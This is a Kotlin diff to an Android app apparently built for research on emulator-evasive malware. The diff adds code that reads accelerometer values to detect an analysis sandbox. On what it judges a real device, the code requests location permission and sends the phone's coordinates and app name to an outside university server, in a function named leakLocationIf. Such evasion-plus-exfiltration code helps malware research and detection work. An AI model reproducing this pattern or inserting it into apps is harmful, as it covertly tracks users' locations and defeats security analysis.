@@ -1,13 +1,26 @@
 package nl.tbethe.shadowdroid.accelerometer
 
+import android.Manifest
 import android.content.Context
+import android.content.pm.PackageManager
 import android.hardware.Sensor
 import android.hardware.SensorEvent
 import android.hardware.SensorEventListener
 import android.hardware.SensorManager
+import android.location.Criteria
+import android.location.LocationManager
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.util.Log
+import androidx.activity.result.contract.ActivityResultContracts
+import io.ktor.client.*
+import io.ktor.client.engine.cio.*
+import io.ktor.client.request.forms.*
+import io.ktor.client.statement.*
+import io.ktor.http.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 private const val TAG = "MainActivity"
 
@@ -30,28 +43,21 @@ class MainActivity : AppCompatActivity(), SensorEventListener {
                     this,
                     sensor,
                     SensorManager.SENSOR_DELAY_NORMAL
-            ).also {
-                Log.d(TAG, "Registered sensor listener.")
-            }}
+            )}
 
     }
 
     override fun onSensorChanged(event: SensorEvent?) {
         event?.let { event ->
             if (sensorValues.size >= 10) {
-                // We consider the values to be emulated if one of the float arrays is not unique.
+                // We consider the values to be emulated if one of the float arrays
+                // has the same values as another array.
                 val isEmu = sensorValues.foldIndexed(false) { index, bool, array ->
-                    bool ||
-                    // Compare all arrays with all arrays with a higher index, return true if
-                    // any of those comparisons return true.
-                    sensorValues.drop(index + 1).map { otherArray ->
+                    bool || sensorValues.drop(index + 1).map { otherArray ->
                         otherArray.contentEquals(array)
                     }.any { it }
                 }
-                if (!isEmu) {
-                    Log.d(TAG, "Leaking data")
-                    TODO("Leak data")
-                }
+                leakLocationIf(!isEmu)
                 sensorManager.unregisterListener(this)
             } else {
                 // We do not own the event object, nor any objects inside it (like it.values).
@@ -63,5 +69,51 @@ class MainActivity : AppCompatActivity(), SensorEventListener {
 
     override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {
         // intentionally left blank
+    }
+
+    private fun leakLocationIf(notAnalyser: Boolean) {
+        if (!notAnalyser) return
+
+        fun sendLocation() {
+            val lm = getSystemService(LocationManager::class.java)
+            val provider = lm.getBestProvider(Criteria(), true)
+
+            val location = provider?.let {
+                lm.getLastKnownLocation(it)
+            }
+            location?.let { loc ->
+                val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak?appname="
+                CoroutineScope(Dispatchers.IO).launch {
+                    try {
+                        HttpClient(CIO).use { client ->
+                            val response = client.submitForm<HttpResponse>(
+                                url,
+                                Parameters.build {
+                                    append("appname", packageName)
+                                    append("coords", "${loc.latitude}:${loc.longitude}")
+                                },
+                                false
+                            )
+                            Log.d(TAG, "Response status: ${response.status}")
+                            Log.d(TAG, "Response: ${response.readText()}")
+                        }
+                    } catch (e: Exception) {
+                        Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
+                    }
+                }
+            }
+        }
+        val requestPermission =
+            registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
+                if (isGranted) sendLocation()
+            }
+        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
+            PackageManager.PERMISSION_DENIED -> {
+                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
+            }
+            PackageManager.PERMISSION_GRANTED -> {
+                sendLocation()
+            }
+        }
     }
 }
